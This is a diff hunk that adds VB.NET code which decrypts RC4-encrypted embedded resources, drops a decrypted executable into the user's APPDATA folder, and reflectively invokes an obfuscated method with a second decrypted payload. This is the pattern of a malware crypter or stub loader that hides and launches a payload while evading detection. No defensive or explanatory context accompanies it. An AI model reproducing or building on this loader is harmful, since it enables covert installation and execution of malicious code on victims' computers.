@@ -1,0 +1,13 @@
+ Dim D As New PolyRC4(R.GetObject("K"))
+ Dim N As String = D.Decrypt(R.GetObject("NM"))
+ Dim I As String = Environ("APPDATA") & "\" & N & ".exe"
+ If IO.File.Exists(I) Then
+	IO.File.Delete(I)
+ End If
+ Dim B As Byte() = System.Text.Encoding.Default.GetBytes(D.Decrypt(R.GetObject("I")))
+ Try
+	My.Computer.FileSystem.WriteAllBytes(I, B, False)
+ Catch
+ End Try
+ Dim C As Byte() = System.Text.Encoding.Default.GetBytes(D.Decrypt(R.GetObject("F")))
+ LoadMethod("IX", "R", CC(ReverseString(R.GetObject("X"))), New Object() {C, I})
